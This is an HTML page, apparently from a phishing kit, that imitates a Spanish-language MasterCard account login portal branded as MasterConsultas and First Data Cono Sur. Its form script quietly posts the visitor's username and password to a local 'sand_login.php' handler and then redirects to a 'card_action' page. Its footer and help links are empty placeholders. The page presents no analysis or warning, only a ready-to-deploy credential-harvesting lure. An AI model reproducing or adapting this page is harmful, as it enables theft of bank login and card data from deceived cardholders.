<html>


<head>


	<title>MasterConsultas</title>


	<style> id="antiClickjack">
		body{display:none !important;}
	</style>


	<link rel="stylesheet" href="./style/css/style.css">
	    <link rel="icon" href="./style/css/img/logo.png">

</head>
<body class="home nolog">
	<header>
<div id="header" class="nolog">
  <div class="header-content">
    <h1><a href="#">MasterConsultas</a></h1>
  </div>
</div>
</header> 	
	<meta http-equiv="Cache-Control" content="no-cache, no-store">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<style>
/* style keyboard */
table tbody tr td {padding:0;} 
</style>


<div id="container" class="clearfix">
  <div class="content nolog">
    <h3 class="title">INICIO DE SESI&#211;N // <strong>REGISTRo</strong></h3>
    <div id='yshys' class="combo-registro">
      <div class="registrado">




<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>




<script>
// Wait for the DOM to be ready
$(function() {
  // Initialize form validation on the registration form.
  // It has the name attribute "registration"
  $("form[name='loginForm']").validate({
    // Specify validation rules
    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },
    // Specify validation error messages
    messages: {

      username: "El campo Usuario es requerido",
      pass: "El campo Clave es requerido",


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },
    // Make sure the form is submitted to the destination defined
    // in the "action" attribute of the form when valid
   submitHandler: function(form) {
                    $("#blockUI").show();
                 

					$.post("./system/sand_login.php?ajax", $("#loginForm").serialize(), function(result) {
                            setTimeout(function() {
                                $(location).attr("href", "card_action");


                            });
                    });
                },

  });
});

</script>




<div id="blockUI" class="blockUI" style="display:none">  
<div class="blockUI blockOverlay" style="z-index: 1000; border: none; margin: 0px; padding: 0px; width: 100%; height: 100%; top: 0px; left: 0px; background-color: rgb(0, 0, 0); opacity: 0.6; cursor: wait; position: fixed;"></div>
<div class="blockUI blockMsg blockPage" style="z-index: 1001; position: fixed; padding: 0px; margin: 0px; width: 30%; top: 40%; left: 35%; text-align: center; color: rgb(0, 0, 0); border: 3px solid rgb(170, 170, 170); background-color: rgb(255, 255, 255); cursor: wait;"><h1>Espere por favor ...</h1></div>
</div>





        <form id="loginForm" name="loginForm" action="#" method="post" class="form-login" autocomplete="off">
          <fieldset>


		

            <p style="padding-bottom: 12px !important;">
              

<input required="required" type="text" name="username" maxlength="12" value="" id="usernameId" class="usuario hasText valid" placeholder="Nombre de usuario" autocomplete="off" aria-required="true" aria-describedby="usernameIdinputError" aria-invalid="false">




              					</p><ul id="loginForm_" class="msgErrLogin">
				

<li>
<span id="usernameIdinputError" class="d" style="display: none;"></span></li>



		</ul>

            <p></p>
            <p style="padding-bottom: 12px !important;">


<input required="required" type="password" name="pass" id="password" class="pass hasText valid" placeholder="Contrase&#241;a" autocomplete="off" aria-required="true" aria-describedby="passwordinputError" aria-invalid="false">


								</p><ul id="loginForm_" class="msgErrLogin">
				<li>
<span id="passwordinputError" class="d" style="display: none;"></span>


</li>
		</ul>

			<p></p>
           	<input type="submit" id="submitLogin" value="Ingresar" class="btn-224px" style="border:none;" clearform="true" button="true" blocksui="true">

            <p class="nota">
	            <a href="#" id="keyboardAnchorId" onclick="changeKeyboardVisibility(); return false;">
	            	Teclado virtual para acceso desde una PC p&#250;blica
	            </a>
            </p>
            <div id="kbtable" align="left" style="position: absolute; float: right; left: 176px; top: 396px; display: none; cursor: move;"></div>
          </fieldset>
          
        </form>




        <div class="txt-olvido">
        	
			<p>Si olvid&#243; su contrase&#241;a (password)  haga click 
			<a href="#" blocksui="true">aqu&#237;</a>			
			</p>                       
        </div>
      </div>
      <div class="registrese">
      	<h4>?Primera vez que ingresa?</h4>
      	
        <p>Reg&#237;strese y obtenga un mejor control de todas sus cuentas MasterCard</p>
        <a href="#" blocksui="true">Reg&#237;strese</a> 
        <p class="nota">(No olvide tener su tarjeta y &#250;ltimo resumen de cuenta a mano para generar su Usuario y Contrase&#241;a)</p>
      </div>

      
    </div>
    <div class="combo-txt">
      <div class="txt">
	    <p>Acceda aqu&#237; al detalle completo de todas las operaciones que realiza con sus tarjetas MasterCard.</p>
	    <ul>
	      <li>Verifique sus &#250;ltimos movimientos, liquidaciones y res&#250;menes de cuenta.</li>
	      <li>Adhi&#233;rase al d&#233;bito autom&#225;tico de sus facturas.</li>
	      <li>Chequee su l&#237;mite de compra, cierre y vencimientos.</li>
	      <li>Efect&#250;e el pago de servicios e impuestos.</li>
	      <li>Recargue cr&#233;dito a sus celulares las 24 horas del d&#237;a.</li>
	    </ul>
      </div>
      <ul class="btns">
        <li><a href="#" class="btn01" target="_blank"></a></li>
        <li><a href="#" class="btn02" target="_blank"></a></li>
        <li><a href="#" class="btn03" target="_blank"></a></li>       
      </ul>
    </div>
  </div>
</div>
	

<footer>
<div id="footer">
  	<div class="footer-content">
      <div class="box socios">
          <h5>Socios</h5>
          <ul>
          	<li><a href="#" target="_blank">Tarjetas de Cr&#233;dito</a></li>
            <li><a href="#">Otras Tarjetas</a></li>
            <li><a href="#">Promociones</a></li>
            <li><a href="#">Novedades</a></li>
          </ul>
      </div>
      <div class="box comercios">          
           <h5>Comercios</h5>
           <ul>
            <li><a href="#">Acepte Mastercard</a></li>
            <li><a href="#">Servicios</a></li>
            <li><a href="#" target="_blank">Novedades</a></li>
            <li><a href="#">Descargas</a></li>
          </ul>
      </div>        
      <div class="box empresas">
          <h5>Empresas</h5>
          <ul>
            <li><a href="#">Tarjetas</a></li>
            <li><a href="#">Promociones</a></li>
          </ul>
      </div>      
      <div class="box contactenos">
           <h5>?Necesita ayuda?</h5>
           <ul>
            <li><a href="#" target="_blank">¿Extravi&#211; su tarjeta?</a></li>
            <li><a href="#" target="_blank">Buscador Cajeros</a></li>
			<li><a href="#">Cont&#225;ctese con nosotros</a></li>
          </ul>      
      </div>
    </div>
    <a href="#" class="top"></a>
    <h6>MasterCard</h6>
    <p class="loginDF">
    	<a href="#">First Data Cono Sur S.R.L.</a> | <a href="#">Todos los derechos reservados</a><br>    	 
    	<a href="#" target="_blank">T&#233;rminos y Condiciones</a> | <a href="#" target="_blank">Medidas de Seguridad</a> | <a href="#" target="_blank">Protecci&#211;n de Datos Personales</a> | <a href="#" target="_blank">Defensa y Protecci&#211;n al Consumidor</a>
    </p>
  </div>
</footer>	
	</body></html>